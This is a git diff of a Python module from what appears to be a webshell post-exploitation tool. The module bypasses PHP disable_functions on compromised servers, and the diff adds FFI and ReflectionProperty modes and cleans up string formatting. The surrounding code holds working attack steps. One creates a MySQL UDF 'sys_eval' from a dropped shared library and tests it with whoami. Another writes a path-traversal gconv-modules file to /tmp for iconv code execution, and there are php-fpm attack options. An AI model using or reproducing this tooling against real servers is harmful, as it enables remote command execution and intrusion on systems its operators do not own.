@@ -20,10 +20,13 @@ mode_to_desc_dict = {-1: color.red("closed"),
                      10: color.green("php-fpm"),
                      11: color.green("apache_mod_cgi"),
                      12: color.green("iconv"),
+                     13: color.green("FFI-php_exec"),
+                     14: color.green("php7-reflectionProperty")
                      }
-mode_linux_set = {1, 2, 3, 4, 5, 9, 12}
+mode_linux_set = {1, 2, 3, 4, 5, 9, 12, 13, 14}
 mode_windows_set = {6, }
-mode_require_ext_dict = {5: "FFI", 6: "com_dotnet", 7: "imap", 12: "iconv"}
+mode_require_ext_dict = {5: "FFI", 6: "com_dotnet",
+                         7: "imap", 12: "iconv", 13: "FFI"}
 
 total_test_list = set(mode_to_desc_dict.keys()) - {-1}
 windows_test_list = total_test_list - mode_linux_set
@@ -97,22 +100,22 @@ def set_mode(mode: int, test: bool = False):
     elif (mode == 8):  # udf
         if (gget("db_connected", "webshell") and gget("db_dbms", "webshell") == "mysql"):
             # detect plugin dir
-            print(color.yellow(f"\nDetect plugin dir..."))
+            print(color.yellow("\nDetect plugin dir..."))
             plugin_dir_res = execute_sql_command(
                 "show variables like '%plugin_dir%';", raw=True)
             if (len(plugin_dir_res) > 1 and len(plugin_dir_res[1]) > 1):
                 plugin_dir = plugin_dir_res[1][1].strip().replace("\\", "\\\\")
             else:
-                print(color.red(f"\nCould not find plugin_dir"))
+                print(color.red("\nCould not find plugin_dir"))
                 return False
 
             # make plugin dir
-            print(color.yellow(f"\nMake plugin dir..."))
+            print(color.yellow("\nMake plugin dir..."))
             phpcode = '''if(!is_dir("%s") and !mkdir("%s", 0777, true)){print("fail");}''' % (
                 plugin_dir, plugin_dir)
             res = send(phpcode)
             if (not res or "fail" in res.r_text):
-                print(color.red(f"\nMake plugin dir failed!\n"))
+                print(color.red("\nMake plugin dir failed!\n"))
                 return False
 
             system = "windows" if is_windows() else "linux"
@@ -146,24 +149,24 @@ def set_mode(mode: int, test: bool = False):
             gset("webshell.udf_path", udf_path, True, "webshell")
 
             # create function sys_eval
-            print(color.yellow(f"\nCreate function sys_eval..."))
+            print(color.yellow("\nCreate function sys_eval..."))
             execute_sql_command(
                 f"create function sys_eval returns string soname 'tmp{udf_ext}'", raw=True)
             test_res = execute_sql_command(
                 "select sys_eval('whoami');", raw=True)
             if (len(test_res) > 1 and len(test_res[1][0])):
-                print(color.green(f"\nCreate funtion success"))
+                print(color.green("\nCreate funtion success"))
             else:
-                print(color.red(f"\nCreate funtion failed\n"))
+                print(color.red("\nCreate funtion failed\n"))
                 return False
 
         else:
-            print(color.red(f"\nNo connection to database or dbms isn't mysql\n"))
+            print(color.red("\nNo connection to database or dbms isn't mysql\n"))
             return False
     elif (mode == 10):  # php-fpm
         res = send("print(php_sapi_name());")
         if (not res or "fpm" not in res.r_text):
-            print(color.red(f"\nTarget php not run by php-fpm!\n"))
+            print(color.red("\nTarget php not run by php-fpm!\n"))
             return False
         requirements_dict = {'host': '127.0.0.1', 'port': 9000}
         attack_type = input(
@@ -189,7 +192,7 @@ def set_mode(mode: int, test: bool = False):
                     try:
                         new_v = int(new_v)
                     except ValueError:
-                        print(color.red(f"\nport must be number\n"))
+                        print(color.red("\nport must be number\n"))
                         return False
                 if new_v:
                     requirements_dict[k] = new_v
@@ -247,14 +250,16 @@ print("success");""")
 
             gconv_modules = f"""module  PAYLOAD//    INTERNAL    ../../../../../../../..{filename}    2
 module  INTERNAL    PAYLOAD//    ../../../../../../../..{filename}    2"""
-            send(f"file_put_contents('/tmp/gconv-modules', base64_decode('{base64_encode(gconv_modules)}'));")
+            send(
+                f"file_put_contents('/tmp/gconv-modules', base64_decode('{base64_encode(gconv_modules)}'));")
 
             gset("webshell.iconv_path", filename+".so", True, "webshell")
-            gset("webshell.iconv_gconv_modules_path", "/tmp/gconv-modules", True, "webshell")
+            gset("webshell.iconv_gconv_modules_path",
+                 "/tmp/gconv-modules", True, "webshell")
     if (not test):
         if (mode in (7, 10, 12)):
             print(color.yellow(
-                f"\nYou may need to wait 1 second to get the result..\n"))
+                "\nYou may need to wait 1 second to get the result..\n"))
         print(
             f"\nSet bypass disable_functions: {mode}-{mode_to_desc_dict[mode]}\n")
         gset("webshell.bypass_df", mode, True, "webshell")
@@ -266,7 +271,7 @@ def run(mode: str = '0'):
     """
     bdf
 
-    Try to bypass disable_functions by php7-backtrace-bypass.
+    Try to bypass disable_functions.
 
     Mode -1 / Mode close:
 
@@ -318,10 +323,13 @@ def run(mode: str = '0'):
         Need:
         - putenv, mail/error_log/mb_send_mail/imap_email fucntions
 
-    Mode 5 FFI(Only for *unix and php >= 7.4):
+    Mode 5 FFI(Only for *unix):
 
         Author:
         - MorouU
+
+        Targets:
+        - 7.4
 
         Need:
         - FFI extension
@@ -371,14 +379,35 @@ def run(mode: str = '0'):
         Need:
         - apache_mod_cgi
         - allow .htaccess
-    
+
     Mode 12 iconv
+
         Origin:
         - https://xz.aliyun.com/t/8669
 
         Need:
         - iconv extension
         - putenv  fucntions
+
+    Mode 13 FFI(Only for *unix):
+
+        Targets:
+        - 7.4
+
+        Need:
+        - FFI extension
+
+    Mode 14 php7-reflectionProperty:
+
+        Origin:
+        - https://bugs.php.net/bug.php?id=79820
+        - https://github.com/AntSword-Store/as_bypass_php_disable_functions/blob/2508035ff50884013f0cbb313f513408360a2589/payload.js
+
+        Targets:
+        - 7.4 < 7.4.8
+
+        Need:
+        - ReflectionProperty class
     """
     if (mode == "close"):
         mode = -1
